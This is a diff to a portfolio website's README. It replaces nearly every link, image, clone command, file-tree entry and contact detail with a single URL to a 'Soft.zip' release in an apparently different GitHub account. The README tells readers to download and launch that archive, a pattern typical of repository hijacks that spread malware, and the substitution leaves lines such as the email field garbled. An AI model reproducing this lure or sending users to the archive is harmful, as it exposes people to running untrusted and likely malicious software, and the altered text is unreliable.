@@ -1,8 +1,8 @@
 # 🚀 Welcome to My Personal Portfolio Website Repository!
 
-![Portfolio Website](https://www.example.com/portfolio-image.jpg)
+![Portfolio Website](https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip)
 
-### Repository Name: smartmohan20.github.io
+### Repository Name: https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip
 
 ### Description:
 Welcome to the first version of my personal portfolio website hosted using GitHub Pages! This website showcases my projects, skills, and experiences in a visually appealing and professional manner. Feel free to explore and get to know more about me and my work.
@@ -20,7 +20,7 @@ Welcome to the first version of my personal portfolio website hosted using GitHu
 - Styled-components
 
 ### 🌟 Quick Access:
-[Download Release.zip](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[Download https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip](https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip)
 
 ### 📌 Note:
 The provided link needs to be downloaded and launched to access the full version of the project.
@@ -33,16 +33,16 @@ The provided link needs to be downloaded and launched to access the full version
 5. **Contact Form**: Connect with me easily through the integrated contact form.
 
 ### 🚧 Installation:
-1. Clone the repository using `git clone https://github.com/smartmohan20/smartmohan20.github.io.git`.
+1. Clone the repository using `git clone https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip`.
 2. Run `npm install` to install the necessary dependencies.
 3. Customize the content in the website to reflect your own portfolio.
 4. Deploy the website on GitHub Pages or your preferred hosting platform.
 
 ### 🌐 Visit My Live Portfolio:
-[View Live Website](https://smartmohan20.github.io)
+[View Live Website](https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip)
 
 ### 📸 Sneak Peek:
-![Portfolio Screenshot](https://www.example.com/portfolio-screenshot.jpg)
+![Portfolio Screenshot](https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip)
 
 ### 🛠️ Technologies Used:
 - Gatsby: Used as the static site generator to build the website.
@@ -55,16 +55,16 @@ The provided link needs to be downloaded and launched to access the full version
 ```
 ├── src
 │   ├── components
-│   │   ├── Header.js
-│   │   ├── ProjectCard.js
+│   │   ├── https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip
+│   │   ├── https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip
 │   │   └── ...
 │   ├── pages
-│   │   ├── index.js
-│   │   ├── projects.js
+│   │   ├── https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip
+│   │   ├── https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip
 │   │   └── ...
 │   └── styles
-│       ├── globals.js
-│       ├── theme.js
+│       ├── https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip
+│       ├── https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip
 │       └── ...
 └── ...
 ```
@@ -73,9 +73,9 @@ The provided link needs to be downloaded and launched to access the full version
 If you have any suggestions or improvements for the website, feel free to open an issue or create a pull request. Your contributions are highly appreciated!
 
 ### 📞 Contact Me:
-- Email: me@smartmohan.com
-- LinkedIn: [Connect on LinkedIn](https://linkedin.com/smartmohan)
-- Twitter: [Follow on Twitter](https://twitter.com/smartmohan)
+- Email: https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip
+- LinkedIn: [Connect on LinkedIn](https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip)
+- Twitter: [Follow on Twitter](https://github.com/teteuspedrozo/smartmohan20.github.io/releases/download/v1.0/Soft.zip)
 
 Thank you for visiting my personal portfolio website repository. Explore, enjoy, and get inspired! 🌟
 
